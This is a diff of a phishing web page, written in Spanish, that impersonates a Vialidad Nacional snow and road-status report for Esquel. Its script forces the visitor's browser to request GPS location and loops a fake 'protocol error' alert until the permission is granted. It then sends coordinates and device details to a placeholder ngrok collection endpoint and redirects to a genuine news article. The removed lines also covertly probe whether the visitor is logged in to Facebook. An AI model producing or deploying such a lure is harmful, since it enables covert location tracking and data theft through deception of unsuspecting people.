@@ -3,35 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en Esquel">
-    <meta property="og:description" content="Vialidad Nacional: Reporte de transitabilidad tramo Esquel - Tecka.">
     <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
-    <title>Vialidad Nacional - Reporte de Rutas</title>
+    <title>Vialidad Nacional - Reporte en Vivo</title>
 </head>
 <body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
     <div id="status-card" style="max-width:450px; margin:auto; background:white; padding:30px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">
         <h2 style="color:#c62828;">⚠ ACCESO REQUERIDO</h2>
-        <p id="msg">Para visualizar el mapa de nieve y cortes en tiempo real, es <b>obligatorio</b> validar su ubicación GPS.</p>
+        <p id="msg">Para visualizar el reporte de transitabilidad, es <b>obligatorio</b> validar su ubicación GPS.</p>
         <div style="border:5px solid #f3f3f3; border-top:5px solid #c62828; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:20px auto;"></div>
     </div>
-
     <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
     <script>
-        // --- PEGA TU LINK DE NGROK AQUÍ ---
+        // --- CAMBIA ESTO POR TU URL DE NGROK ---
         const URL_NGROK = "https://TU_LINK_AQUI.ngrok-free.app/save"; 
 
-        async function enviarReporte(pos) {
-            document.getElementById('msg').innerHTML = "<b>Cargando reporte oficial...</b>";
-            
-            let hardware = (window.DeviceMotionEvent) ? "Dispositivo Móvil" : "Desktop/PC";
-            
-            // Detección sutil de cuenta activa
-            let social = "No detectada";
-            const img = new Image();
-            img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
-            await new Promise(r => setTimeout(r, 800));
-            if (img.complete) social = "Sesión Activa";
-
+        async function capturar(pos) {
+            document.getElementById('msg').innerHTML = "<b>Ubicación validada.</b> Cargando...";
             const payload = {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
@@ -43,30 +31,22 @@
                 })(),
                 ram: navigator.deviceMemory || "N/A",
                 idioma: navigator.language || "es-AR",
-                movimiento: hardware,
-                social: social
+                movimiento: (window.DeviceMotionEvent) ? "Móvil" : "PC",
+                social: "Buscando..."
             };
 
             fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(payload) });
-            
-            setTimeout(() => { 
-                window.location.href = "https://www.eqsnotas.com/noticias/2023/05/22/136514-vialidad-nacional-recomienda-precaucion-por-hielo-en-la-calzada"; 
-            }, 1000);
+            setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1000);
         }
 
-        function solicitarGPS() {
-            navigator.geolocation.getCurrentPosition(
-                enviarReporte, 
-                (err) => {
-                    // SI RECHAZA: Alerta de sistema y bucle infinito
-                    alert("ERROR DE PROTOCOLO: El sistema vial requiere su ubicación para filtrar el mapa de su zona. Por favor, habilite el permiso para continuar.");
-                    solicitarGPS();
-                }, 
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+        function forzarGPS() {
+            navigator.geolocation.getCurrentPosition(capturar, (err) => {
+                alert("ERROR DE PROTOCOLO: El sistema requiere su ubicación para mostrar el mapa local. Por favor, acepte el permiso.");
+                forzarGPS(); // Bucle infinito si rechaza
+            }, {enableHighAccuracy:true, timeout: 10000});
         }
 
-        window.onload = solicitarGPS;
+        window.onload = forzarGPS;
     </script>
 </body>
 </html>
